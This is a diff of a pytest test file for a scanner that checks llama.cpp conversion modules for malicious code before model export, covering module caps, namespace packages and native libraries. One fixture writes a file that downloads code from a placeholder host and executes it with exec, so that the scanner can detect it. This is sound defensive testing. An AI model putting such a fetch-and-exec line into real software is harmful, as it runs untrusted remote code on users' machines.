@@ -164,6 +164,44 @@ def test_clean_live_root_modules_have_no_findings(scan, name):
     )
 
 
+def test_the_real_conversion_package_fits_under_the_cap(llama_cpp):
+    """A cap below the thing it exists to read is not a safety margin.
+
+    llama.cpp master ships 94 modules in conversion/ and the cap was 64, so the
+    scan reported the genuine package as too big to read on every GGUF export
+    and, under UNSLOTH_CONVERTER_SCAN_STRICT, refused the export outright. This
+    reads the real tree so upstream growing past the cap is a failure here rather
+    than a refusal on a user's machine.
+    """
+    requests = pytest.importorskip("requests")
+    headers = {}
+    if os.environ.get("GITHUB_TOKEN"):
+        headers["Authorization"] = f"Bearer {os.environ['GITHUB_TOKEN']}"
+    try:
+        response = requests.get(
+            "https://api.github.com/repos/ggml-org/llama.cpp/git/trees/master?recursive=1",
+            timeout = 30,
+            headers = headers,
+        )
+    except requests.exceptions.RequestException as exc:
+        pytest.skip(f"network unreachable: {exc}")
+    if response.status_code != 200:
+        pytest.skip(f"tree unavailable: HTTP {response.status_code}")
+
+    paths = [entry["path"] for entry in response.json().get("tree", [])]
+    modules = [path for path in paths if path.startswith("conversion/") and path.endswith(".py")]
+    if not modules:
+        pytest.skip("llama.cpp master no longer has a conversion/ package")
+
+    assert len(modules) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES, (
+        f"conversion/ holds {len(modules)} modules and the cap is "
+        f"{llama_cpp.MAX_CONVERSION_PACKAGE_FILES}: the genuine package would be "
+        f"reported as unreadable on every export, and refused under strict mode"
+    )
+    entries = [path for path in paths if path.startswith("conversion/")]
+    assert len(entries) <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES, len(entries)
+
+
 def test_clean_ordinary_converter_shaped_script_has_no_findings(scan):
     """A converter doing normal converter things stays quiet."""
     source = b"""
@@ -1583,13 +1621,14 @@ def test_a_root_package_that_shadows_a_converter_import_is_scanned(tmp_path, mon
         llama_cpp._scan_conversion_package(str(root))
 
 
-def test_the_rest_of_the_checkout_is_not_walked(tmp_path, monkeypatch):
-    """The root is scanned without recursion on purpose.
+def test_each_root_directory_is_its_own_bounded_location(tmp_path, monkeypatch):
+    """Namespace directories are scanned, but each as a location of its own.
 
-    llama.cpp's checkout is enormous and none of it is importable by itself, so
-    walking it would cross every budget on an ordinary install and refuse the
-    export. Only the root's own modules, and directories that really are
-    packages, are read.
+    An earlier version skipped a root directory with no __init__.py, reasoning
+    that a namespace package runs nothing on import. `from shadow import payload`
+    imports the submodule and that does run, so it is scanned now. The root
+    itself stays non-recursive, and each directory carries its own budget, which
+    is what keeps one enormous subtree from spending the whole allowance.
     """
     llama_cpp = _load("llama_cpp_shadow_scope_probe", "unsloth_zoo/llama_cpp.py")
 
@@ -1600,86 +1639,60 @@ def test_the_rest_of_the_checkout_is_not_walked(tmp_path, monkeypatch):
         (big / "buried.py").write_text("VALUE = 1\n", encoding = "utf-8")
 
     locations = llama_cpp._scanned_locations(str(root))
-    assert {label for label, _path, _recursive in locations} == {"conversion", "."}
-    # The flag itself, not just the label: this is what keeps the rest of the
-    # checkout out, and flipping it is invisible to a label assertion.
-    assert dict((label, recursive) for label, _path, recursive in locations)["."] is False
-
-    read = []
-    real_open = open
-
-    def watch(path, *args, **kwargs):
-        read.append(str(path))
-        return real_open(path, *args, **kwargs)
-
-    monkeypatch.setattr("builtins.open", watch)
-    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
-    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
-    llama_cpp._scan_conversion_package(str(root))
-
-    assert not [path for path in read if "buried.py" in path], (
-        "the scan descended into the rest of the checkout"
-    )
+    by_label = {location.label: location for location in locations}
+    assert set(by_label) == {"conversion", ".", "ggml", "examples", "tools"}, sorted(by_label)
+    # The root walks its own files only; everything else is reached as itself.
+    assert by_label["."].recursive is False
+    assert by_label["ggml"].recursive is True
+    # Natives count as modules only where an extension module would really live.
+    assert by_label["conversion"].natives is True
+    assert by_label["."].natives is False and by_label["ggml"].natives is False
 
 
-def test_the_disable_switch_touches_nothing_and_reads_nothing(tmp_path, monkeypatch):
-    """UNSLOTH_DISABLE_CONVERTER_SCAN is documented as skipping the scan entirely.
-
-    The per-file checks did return early, but only after the whole tree had been
-    walked and every module read, and the bytecode purge still DELETED files
-    inside a checkout the user pinned. Opting out of a scan is not permission to
-    rewrite the directory it would have scanned.
-    """
-    llama_cpp = _load("llama_cpp_disabled_probe", "unsloth_zoo/llama_cpp.py")
+def test_a_payload_in_a_root_namespace_package_is_scanned(tmp_path, monkeypatch):
+    """The submodule is what executes, and it was not being read."""
+    llama_cpp = _load("llama_cpp_namespace_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
-    cache = root / "conversion" / "__pycache__"
-    cache.mkdir()
-    supplied = cache / "base.cpython-313.pyc"
-    supplied.write_bytes(_pyc(0))
-    (root / "conversion" / "payload.py").write_text(
+    shadow = root / "shadow"
+    shadow.mkdir()
+    assert not (shadow / "__init__.py").exists(), "a namespace package, deliberately"
+    (shadow / "payload.py").write_text(
         "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
         encoding = "utf-8",
     )
 
-    opened = []
-    real_open = open
-
-    def watch(path, *args, **kwargs):
-        opened.append(str(path))
-        return real_open(path, *args, **kwargs)
-
-    monkeypatch.setattr("builtins.open", watch)
-    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
     monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
-
-    llama_cpp._scan_conversion_package(str(root))
-    assert llama_cpp._purge_imported_package_bytecode(str(root)) == ()
-
-    assert supplied.exists(), "the opt-out deleted a file in the user's checkout"
-    assert not [path for path in opened if path.endswith(".py")], opened
-
-    # And with the switch off, the same tree is read and the cache removed.
     monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
     with pytest.raises(llama_cpp.ConverterScanError):
         llama_cpp._scan_conversion_package(str(root))
-    assert not supplied.exists()
 
 
-def test_the_cache_key_still_moves_with_the_scan_disabled(tmp_path, monkeypatch):
-    """The key serves the patcher, not the scan, so a re-pulled checkout still
-    has to re-patch even when nobody is scanning it."""
-    llama_cpp = _load("llama_cpp_disabled_key_probe", "unsloth_zoo/llama_cpp.py")
+def test_a_prebuilt_bundles_own_libraries_are_not_a_finding(tmp_path, monkeypatch, caplog):
+    """_place_prebuilt_binaries copies .so/.dylib/.dll into the llama.cpp root and
+    into directories beside it. Calling each of those an opaque Python module
+    warned on every ordinary prebuilt install and, under strict mode, refused the
+    export before the converter ran."""
+    llama_cpp = _load("llama_cpp_bundle_libs_probe", "unsloth_zoo/llama_cpp.py")
 
     root = _package_root(tmp_path)
-    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
+    for name in ("libggml.so", "libllama.so", "libmtmd.dylib"):
+        (root / name).write_bytes(b"\x7fELF")
+    rocm = root / "hipblaslt"
+    rocm.mkdir()
+    (rocm / "libhipblaslt.so").write_bytes(b"\x7fELF")
 
-    before = llama_cpp._conversion_sibling_info(str(root))
-    assert before is not None
-    (root / "conversion" / "base.py").write_text(
-        "X = 1\nY = 2  # changed\n", encoding = "utf-8",
-    )
-    assert llama_cpp._conversion_sibling_info(str(root)) != before
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))      # must not raise
+    assert caplog.records == [], [r.message for r in caplog.records]
+
+    # Inside a package the converter imports by name, a native file still is one.
+    (root / "conversion" / "fast.so").write_bytes(b"\x7fELF")
+    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
+        llama_cpp._scan_conversion_package(str(root))
 
 
 def _package_root(tmp_path):
